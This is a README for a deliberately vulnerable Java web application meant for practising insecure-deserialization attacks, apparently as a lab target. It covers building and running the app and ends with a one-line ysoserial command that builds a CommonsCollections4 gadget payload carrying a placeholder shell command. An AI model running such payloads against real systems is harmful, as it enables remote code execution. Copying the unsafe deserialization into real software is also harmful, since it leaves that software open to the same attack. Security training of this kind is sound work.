# java-deserialize-webapp

This application is attempts to java deserialize user provided input. commons-collections4:4.0 is on classpath and can be used for exploitation.

![deserialize](https://cloud.githubusercontent.com/assets/4956006/15084178/28306b00-13d2-11e6-97a5-e8c08f25150b.png)

## Building

(already done)

```sh
mvn clean package
```

## Running

By default, application binds to 0.0.0.0:8000 (to bind to localhost, edit src/main/java/hvqzao/java/deserialize/webapp/embedded/Server.java file and rebuild the project).

Linux:

```sh
git clone https://github.com/hvqzao/java-deserialize-webapp
cd java-deserialize-webapp
sh target/bin/webapp
```

Windows:

```sh
git clone https://github.com/hvqzao/java-deserialize-webapp
cd java-deserialize-webapp
start target/bin/webapp.bat
```

## Example attack

```sh
java -jar ysoserial-0.0.4-all.jar CommonsCollections4 'shell command...' | base64 | tr -d "\n"
```

## License

[MIT License](LICENSE)

